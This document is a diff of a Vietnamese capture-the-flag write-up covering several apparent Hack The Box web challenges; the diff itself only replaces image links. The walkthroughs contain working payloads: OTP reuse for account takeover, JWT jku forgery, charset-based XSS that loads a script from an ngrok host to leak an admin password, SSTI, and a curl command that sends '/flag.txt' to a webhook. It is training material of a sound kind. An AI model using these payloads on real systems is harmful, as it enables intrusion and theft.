@@ -33,9 +33,9 @@ https://drive.google.com/file/d/1UxpqCJGXklVGBE1C1BwcnFUfJ3WEpb9V/view?usp=shari
 
 Đề bài cho mình 2 trang web như sau
 
-![image](https://hackmd.io/_uploads/Hk5QYHHBJl.png)
+![image](./images/image0.png)
 
-![image](https://hackmd.io/_uploads/By94YHHBJe.png)
+![image](./images/image1.png)
 
 <details>
 <summary>Dockerfile</summary>
@@ -135,11 +135,11 @@ stderr_logfile_maxbytes=0
 
 Đọc qua cấu hình của web thì nó sẽ có 3 service, một là /app của web được expose trên port 1337, hai là email client được expose ở port 8080, ba là mailhog ở port 9000 dùng để gửi email
 
-![image](https://hackmd.io/_uploads/H19LKBHr1g.png)
+![image](./images/image2.png)
 
 Đầu tiên mình tạo một account và đăng nhập nhưng không có gì hot cả nên mình đọc lại source
 
-![image](https://hackmd.io/_uploads/rkNYeLBH1g.png)
+![image](./images/image3.png)
 
 ```js
 async function initializeDatabase() {
@@ -274,43 +274,43 @@ async function getPasswordReset(token) {
 
 Trong truy vấn tạo OTP thì có thêm vào param used_id nhưng khi get thì lại không. Qua đó mình có thể lấy OTP của user khác để đổi mật khẩu mail admin. Nên mình thực hiện đổi mật khẩu của mail ```test@email.htb``` mà đã được đề bài đưa lên port 8080 ở trong file trên
 
-![image](https://hackmd.io/_uploads/HJmqKSSBkl.png)
+![image](./images/image4.png)
 
 Sau khi đổi mật khẩu thì mình catch được một cái request như sau
 
-![image](https://hackmd.io/_uploads/Bk20X8rSJg.png)
+![image](./images/image5.png)
 
 Ok thì mình thử gen ra một cái token khác và thử đổi mật khẩu của mail admin và Bumphhh
 
-![image](https://hackmd.io/_uploads/rkzN9SHSyl.png)
+![image](./images/image6.png)
 
 Vậy là mình đã đổi được mật khẩu của admin nên mình sẽ đăng nhập vào 
 
-![image](https://hackmd.io/_uploads/r1UwcrBrJe.png)
+![image](./images/image7.png)
 
 Đây là nơi mà ta tạo note khi nãy 
 
-![image](https://hackmd.io/_uploads/By4ucSBB1g.png)
+![image](./images/image8.png)
 
 Mình thử test một cái note xem 
 
-![image](https://hackmd.io/_uploads/HyT-jBHHkx.png)
+![image](./images/image9.png)
 
-![image](https://hackmd.io/_uploads/Hk4GsBBBJe.png)
+![image](./images/image10.png)
 
 Ok ngon rồi, bây giờ chỉ cần thêm image trong markdown để lấy flag là xong.
 
-![image](https://hackmd.io/_uploads/BkMUTBSSye.png)
+![image](./images/image11.png)
 
-![image](https://hackmd.io/_uploads/S1SATSSBkg.png)
+![image](./images/image12.png)
 
 Vậy là mình đã command injection thành công ở đây mình check source của image thì đã thấy bị base64 encode nên mình tiến hành decode lại.
 
-![image](https://hackmd.io/_uploads/H1Jx0SSr1x.png)
+![image](./images/image13.png)
 
 Và chúng ta đã có flag
 
-![image](https://hackmd.io/_uploads/rkd70HBBkl.png)
+![image](./images/image14.png)
 
 Flag : HTB{FAKE_FLAG_FOR_TESTING}
 
@@ -329,13 +329,13 @@ https://drive.google.com/file/d/1W2nBbtwtoO5JN_ZLkBz31ORjzdiL03Kc/view?usp=shari
 
 Đề bài cho mình một trang web như sau
 
-![image](https://hackmd.io/_uploads/H1g7BY8S1x.png)
+![image](./images/image15.png)
 
-![image](https://hackmd.io/_uploads/BkZNBFUryx.png)
+![image](./images/image16.png)
 
 Mở devtool thì mình thấy trang web có sử dụng JWT để lưu session
 
-![image](https://hackmd.io/_uploads/BJY4rYUrke.png)
+![image](./images/image17.png)
 
 Sau khi đọc source thì đây là những file mình cần lưu ý
 
@@ -607,19 +607,19 @@ Phân tích :
 
 Đầu tiên mình phân tích JWT của một account thì nó sử dụng RSASHA256 để tạo signature 
     
-![image](https://hackmd.io/_uploads/SJlCUFLSkx.png)
+![image](./images/image18.png)
 
 Vậy làm sao để crack nó? Thì ở đây mình sẽ tạo một cái public và private key bằng keyid của JWT trên trang web https://mkjwk.org/
     
-![image](https://hackmd.io/_uploads/rk9kt9Lryg.png)
+![image](./images/image19.png)
 
 Sử dụng trình chuyển dổi sang file pem https://8gwifi.org/jwkconvertfunctions.jsp thì mình có kết quả sau
     
-![image](https://hackmd.io/_uploads/SJgFlYcUSke.png)
+![image](./images/image20.png)
 
 Nhưng còn 1 vấn đề là jwt sử dụng jku từ url http://127.0.0.1:1337/.well-known/jwks.json để check signature nhưng key ở trên mình generate ra thì không trùng với của web
     
-![image](https://hackmd.io/_uploads/S11YDF5HJx.png)
+![image](./images/image21.png)
 
 Đọc lại thì có đoạn này để check jku 
     
@@ -657,33 +657,33 @@ Sau đó sử dụng payload sau để giả jku
     
 `"jku": "http://127.0.0.1:1337/api/analytics/redirect?ref=a&<NGROK-SERVER>`
     
-![image](https://hackmd.io/_uploads/rJ5Cu5IByx.png)
+![image](./images/image22.png)
 
 Ok và signature đã được verify. Mình sẽ thực hiện đổi user thành financial-controller@frontier-board.htb để sử dụng
     
-![image](https://hackmd.io/_uploads/ryF5YqUH1g.png)
+![image](./images/image23.png)
 
 Dán vào web thì mình vào được wallet của user financial-controller
     
-![image](https://hackmd.io/_uploads/r1HFF9LBkl.png)
+![image](./images/image24.png)
 
 Mình sẽ thực hiện chuyển hết CLCR nhưng trước đó phải kết bạn với một người nào đó để chuyển
     
-![image](https://hackmd.io/_uploads/HkdaY5IHJe.png)
+![image](./images/image25.png)
 
-![image](https://hackmd.io/_uploads/H1ng5cLHyg.png)
+![image](./images/image26.png)
 
-![image](https://hackmd.io/_uploads/BJkzqq8Bke.png)
+![image](./images/image27.png)
     
-![image](https://hackmd.io/_uploads/SknG59UH1x.png)
+![image](./images/image28.png)
 
 Ok sau khi kết bạn thì mình đã có user để chuyển 
     
-![image](https://hackmd.io/_uploads/r1lOq9IB1x.png)
+![image](./images/image29.png)
 
 Nhưng lại bắt buộc có OTP để confirm việc chuyển
     
-![image](https://hackmd.io/_uploads/ry-K5c8rJg.png)
+![image](./images/image30.png)
 
 Ok thì mình đọc lại file otpMiddleware.js thì thấy hàm check OTP như sau. Ở đây OTP có dạng là số có 4 chữ số nhưng lại check bằng hàm include có nghĩa là mình có thể gen ra tất cả các số có 4 chữ số sau đó web sẽ check valid OTP có trong chuỗi đó không. Thì chắc chắn là có rồi
 
@@ -727,18 +727,18 @@ for (let i=0; i <<= 10000; i++){
 console.log(s)
 ```
 
-![image](https://hackmd.io/_uploads/B19QA58SJl.png)
+![image](./images/image31.png)
 
 Sau khi gen ra thì mình có thể gửi request thành công và chuyển được hết đồng CLCR
 
                        
-![image](https://hackmd.io/_uploads/HJGYyj8rye.png)
+![image](./images/image32.png)
 
-![image](https://hackmd.io/_uploads/ry4kejUHyx.png)
+![image](./images/image33.png)
 
 Cuối cùng ta refresh lại page để nhận flag
                        
-![image](https://hackmd.io/_uploads/Hk_lgi8SJl.png)
+![image](./images/image34.png)
 
 Flag : HTB{f4k3_fl4g_f0r_t35t1ng}
 
@@ -756,13 +756,13 @@ https://drive.google.com/file/d/1pwyKmN1VvCn0OL6lhaillIeb9iu5T6W5/view?usp=shari
 
 Đề bài cho mình một trang web và một hộp thư của email test@email.htb
     
-![image](https://hackmd.io/_uploads/BkThNP_S1g.png)
+![image](./images/image35.png)
     
-![image](https://hackmd.io/_uploads/BJRT4vdryg.png)
+![image](./images/image36.png)
 
 Ở đây thì khi mình đăng nhập thì phải có OTP để vào account 
     
-![image](https://hackmd.io/_uploads/HJl8V__B1x.png)
+![image](./images/image37.png)
 
 ```js
 const registerAPI = async (req, res) => {
@@ -786,11 +786,11 @@ const registerAPI = async (req, res) => {
     
 Sau khi thử hàm parseOneAddress thì mình nhận thấy nó sẽ lấy phần @ đằng trước để tách username và mail nhưng khi được bọc lại bằng dấu "" thì nó sẽ sử dụng dấu @ đằng sau.
     
-![image](https://hackmd.io/_uploads/SJ5ox_OS1g.png)
+![image](./images/image38.png)
 
 Từ đó mình có ý tưởng sẽ sử dụng payload sau `"test@email.htb a"@interstellar.htb` để tách mail ra để check. Mặt khác, phần user cũng được nodemailer sử dụng là test@email.htb và gửi otp đến như hình sau 
 
-![image](https://hackmd.io/_uploads/rJCsVOOHkg.png)
+![image](./images/image39.png)
 
 ```js
 User.createUser = async function (email, password, role = "guest") {
@@ -806,15 +806,15 @@ User.createUser = async function (email, password, role = "guest") {
     
 Ngoài ra trong model của user truyền vào role mặc định là guest nhưng mình có thể add thêm trong khi đăng ký là admin để set role lại như sau
     
-![image](https://hackmd.io/_uploads/S1b1Bu_Skl.png)
+![image](./images/image40.png)
 
 Ok, sau khi có OTP và account role admin thì mình tiến hành đăng nhập vào 
     
-![image](https://hackmd.io/_uploads/S1Nzrdurkl.png)
+![image](./images/image41.png)
 
 Ở đây mình thử add một cái bounty và có được một response như sau
     
-![image](https://hackmd.io/_uploads/SyBhpoFSkl.png)
+![image](./images/image42.png)
 
 Sau khi đọc hàm transmit và doc của needle thì mình có thể dùng proto option để needle fetch một cái html của mình về và lưu vào một file nào đó, và trong file này mình có thể bỏ vào SSTI để cat được flag từ máy chủ
     
@@ -842,11 +842,11 @@ const fetchURL = async (url) => {
     
 
 
-![image](https://hackmd.io/_uploads/Bk2-gvYBke.png)
+![image](./images/image43.png)
 
 Ok thì mình tiến hành PUT thêm vào proto options để lưu nội dung được fetch vào file /app/views/index.html
     
-![image](https://hackmd.io/_uploads/Bk49d3FHyg.png)
+![image](./images/image44.png)
 
 Ở đây mình sẽ ngrok một cái server trả về template SSTI như sau
     
@@ -864,11 +864,11 @@ app.run(port=3001)
     
 
 
-![image](https://hackmd.io/_uploads/SkysunKrJg.png)
+![image](./images/image45.png)
 
 Ok thì khi mình fetch nhận được như sau thì chắc là nội dung này đã được lưu vào file trên
     
-![image](https://hackmd.io/_uploads/HJXp_ntr1x.png)
+![image](./images/image46.png)
 
 Sau khi mình vào http://127.0.0.1:1337 thì không có chuyện gì xảy ra nên chắc là server không bật debug, nên mình dọc lại config của supervisord
     
@@ -886,13 +886,13 @@ stderr_logfile_maxbytes=0
     
 Ở đây khi xảy ra lỗi thì server sẽ tự restart và chạy lại các file nên mình có thể trigger một lỗi để server build lại
     
-![image](https://hackmd.io/_uploads/S1Gyt3Frke.png)
+![image](./images/image47.png)
 
 Ok sau khi build thì khi vào lại mình nhận được kết quả sau    
 
 
     
-![image](https://hackmd.io/_uploads/ByGet3tSkx.png)
+![image](./images/image48.png)
 
 Ok quá ngon, mình đã SSTI thành công. Bây giờ chỉ cần thay đổi payload là có thể lấy được flag
     
@@ -909,13 +909,13 @@ def home():
 app.run(port=3001)
 ```
     
-![image](https://hackmd.io/_uploads/HkGmcnKryx.png)
+![image](./images/image49.png)
 
-![image](https://hackmd.io/_uploads/S13452KBkx.png)
+![image](./images/image50.png)
 
-![image](https://hackmd.io/_uploads/B1jHchYr1e.png)
+![image](./images/image51.png)
 
-![image](https://hackmd.io/_uploads/B14U93tr1e.png)
+![image](./images/image52.png)
 
 Flag : HTB{f4k3_fl4g_f0r_testing}    
 
@@ -933,21 +933,21 @@ https://drive.google.com/file/d/1c12cRXHC89bspsOMR6p5Azcbj_EaS-WU/view?usp=shari
 
 Bài cho mình một trang web như sau có chức năng chỉnh sửa bio, report contract và tạo contract
     
-![image](https://hackmd.io/_uploads/ByiYJaFryx.png)
+![image](./images/image53.png)
 
-![image](https://hackmd.io/_uploads/BkSAyH9HJe.png)
+![image](./images/image54.png)
 
-![image](https://hackmd.io/_uploads/Syx1rr9H1l.png)
+![image](./images/image55.png)
     
 Nhìn qua database có thể thấy khi tạo một user mặc định sẽ là role guest. Ngoài ra có 2 account admin và contract_manager nữa nên mình nghĩ bài này sẽ có dạng privilege escalation
 
 Mình thử vào trang bio và thay đổi thì thấy một điều đặc biệt là content type không có charset. Lúc này thì ta có thể XSS bằng cách sử dụng escape character của ISO-JP-2022. https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
     
-![image](https://hackmd.io/_uploads/Hkq-cScr1e.png)
+![image](./images/image56.png)
 
 Ở đây mình sử dụng payload sau `![%1b$@](a)+%1B(B+![b](onerror=alert(1)//)` để thực hiện XSS. Cụ thể thì khi bung ra image thì nó có dạng `<img src=a alt="%1b$@">%1B(B<img src="onerror=alert(1)//" alt="b"/>` và qua escape character của ISO-JP-2022 thì nó sẽ trở thành `<img src=a alt="¥"><img src="onerror=alert(1)//" alt="b"/>` và lệnh alert sẽ được thực hiện
 
-![image](https://hackmd.io/_uploads/S1wwqHqHyg.png)
+![image](./images/image57.png)
 
 Từ đó mình có payload sau để thực hiện fetch về webhook
     
@@ -1036,13 +1036,13 @@ Nhưng làm sao để gọi file có đuôi trên trong khi endpoint mình cần
     
 Thì mình có tìm ra cách bypass như sau 
     
-![image](https://hackmd.io/_uploads/rkRaNWiBJx.png)
+![image](./images/image58.png)
     
 Ok thì mình có thể get 2 lần endpoint /setting.ico để có thể lưu cache lại
     
-![image](https://hackmd.io/_uploads/Bke_669B1g.png)
+![image](./images/image59.png)
 
-![image](https://hackmd.io/_uploads/BkgJ0p5Hkg.png)
+![image](./images/image60.png)
 
 Và mình để thực hiện XSS thành công
     
@@ -1050,7 +1050,7 @@ Ok, tiếp theo mình sẽ thử vào contract_manager qua database của docker
 
 Ở đây ta có thể search và filter tất cả các contract nhưng cũng không có gì khai thác được
     
-![image](https://hackmd.io/_uploads/HknQmkjHJg.png)
+![image](./images/image61.png)
 
 Nên mình đọc lại source của file ./interstellarAPI/contracts/views.py
     
@@ -1155,7 +1155,7 @@ while 1:
 print("Found : ", admin_pass)    
 ```
     
-![image](https://hackmd.io/_uploads/BkeiU1iBJl.png)
+![image](./images/image62.png)
 
 Ok thì mình đã leak được từ terminal nhưng mình cần leak từ web nên mình sẽ chèn đoạn js giống trên để contract_manager fetch
     
@@ -1186,27 +1186,27 @@ while (!full) {
 }
 ```
     
-![image](https://hackmd.io/_uploads/B1TjKkoSyx.png)
+![image](./images/image63.png)
 
 ok ngon rồi thì mình sẽ đưa lên ngrok để fetch và chỉnh lại bio lại như sau để contract_manager vào /setting.ico và fetch
                                    
 `s=document.createElement('script');s.src='https://c1aa-118-69-116-88.ngrok-free.app/';document.body.appendChild(s);`
 
-![image](https://hackmd.io/_uploads/rJh-xeirJe.png)
+![image](./images/image64.png)
  
 Và ta có thể dễ dàng lấy được mật khẩu của admin
                                    
-![image](https://hackmd.io/_uploads/H1oTklsS1l.png)
+![image](./images/image65.png)
 
 Khi mình vào user admin thì có các trang như sau
                                    
-![image](https://hackmd.io/_uploads/HkS7exiB1l.png)
+![image](./images/image66.png)
 
 Trang Manage templates dùng để tạo templates và quản lý 
                                    
 
                                    
-![image](https://hackmd.io/_uploads/r1PSgxsSkl.png)
+![image](./images/image67.png)
 
 Phân tích code của trang này xí 
                                    
@@ -1238,7 +1238,7 @@ end
 Ta có thể sử dụng payload sau để cat được flag
 `zip_param_to_execute = "-TmTT=\"$(curl https://WEBHOOK-URL/flag=`cat /flag.txt`)\"any.zip"`
 Tiến hành tạo gadget chain   
-![image](https://hackmd.io/_uploads/ry5cCesBye.png)
+![image](./images/image68.png)
 
 Và ta có solve script như sau 
                                    
@@ -1288,6 +1288,6 @@ deserialization('rce.txt')
                                  
 Chạy file và ta có flag
     
-![image](https://hackmd.io/_uploads/SJqg0eiS1g.png)
+![image](./images/image69.png)
 
 Flag : HTB{f4k3_fl4g_f0r_t3st1ng}
